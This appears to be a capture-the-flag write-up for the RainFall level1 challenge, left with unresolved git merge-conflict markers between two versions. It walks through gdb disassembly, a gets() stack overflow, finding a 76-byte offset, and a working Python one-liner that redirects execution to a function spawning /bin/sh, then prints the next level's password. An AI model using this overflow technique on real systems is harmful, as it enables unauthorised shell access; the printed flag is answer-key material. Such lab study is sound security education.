<<<<<<< HEAD

1. Run the Binary and Observe Behavior and find out that it waits user inputs

```level1@RainFall:~$ ./level1 
1234
```
nothting happens

2. use gdb
(gdb) info functions
we find: 
"0x08048444  run
0x08048480  main" might be user defined, we look into these functions by using disassemble


(gdb) disassemble main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.

Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave  
   0x0804847f <+59>:	ret    
End of assembler dump.
(gdb) x/s 0x08048584
0x8048584:	 "/bin/sh"

3. Identified Vulnerabilities

    Buffer Overflow in main()

0x08048490 <+16>: call 0x8048340 <gets@plt>

    gets() reads input without bounds checking, allowing an attacker to overwrite the stack.

Call to system() in run()

0x08048479 <+53>: call 0x8048360 <system@plt>

    run() calls system(), passing a string from memory (0x8048584).

    If the argument is something like "/bin/sh", an attacker could gain shell access.


=======
📘 Buffer Overflow Exploit: Level 1
This is a classic stack-based buffer overflow example that demonstrates how you can redirect program execution to custom code by overflowing a buffer.

⚠️ Vulnerability Summary
The binary uses the unsafe gets() function.

gets() does not check how much input is provided.

So if you input more than the buffer can hold, it will start overwriting adjacent memory — including the saved return address on the stack.

This allows us to control the program's flow after the current function returns.

🧠 Our Goal
There is a hidden function in the binary named run() located at: 0x08048444
This function calls: system("/bin/sh");
💡 If we overwrite the return address to jump to run(), we get a shell as the level1 user.

🔎 Finding the Offset
To exploit this, we first need to know how many bytes it takes to reach the saved return address on the stack.

Step 1: Try 80 characters and check if EIP is overwritten

$ python -c 'print "B" * 80' > /tmp/payload
(gdb) r < /tmp/payload
Output:
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
✅ EIP is overwritten with 0x42 ("B" in ASCII) — good sign.

Step 2: Try 76 characters
$ python -c 'print "B" * 76' > /tmp/payload
(gdb) r < /tmp/payload
Output:
Program received signal SIGILL, Illegal instruction.
0xb7e45400 in __libc_start_main ()
✅ At 76 bytes, we don’t overwrite EIP yet, so offset is exactly 76 bytes.

🛠 Crafting the Exploit
Here’s the working exploit:
(python -c 'import struct; print "A"*76 + struct.pack("<I", 0x08048444)'; cat) | ./level1

🔍 Explanation
python -c '...': We use Python to generate the exploit payload.

"A" * 76: Fills the buffer right up to the return address.

struct.pack("<I", 0x08048444): Packs the address of run() in little-endian format (\x44\x84\x04\x08).
< — little-endian
I — unsigned 4-byte integer

cat: Keeps stdin open — sometimes required if the program reads input again.

| ./level1: Feeds the payload into the vulnerable binary.

✅ What Happens?
gets() reads our input (76 A's + address of run()).

When main() tries to return, it jumps to 0x08048444.

That’s the run() function → which runs system("/bin/sh").


level1@RainFall:~$ (python -c 'import struct; print "A"*76 + struct.pack("<I", 0x08048444)'; cat) | ./level1
or
python -c 'print "B"*76+"\x44\x84\x04\x08"' > /tmp/payload
cat /tmp/payload - | ./level1

Good... Wait what?
./pass
/bin/sh: 1: ./pass: Permission denied
whoami
level2
cat /home/user/level2/.pass            
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
>>>>>>> bcf3207b2bbdb9c37093f82b4d7b39879c50eab2

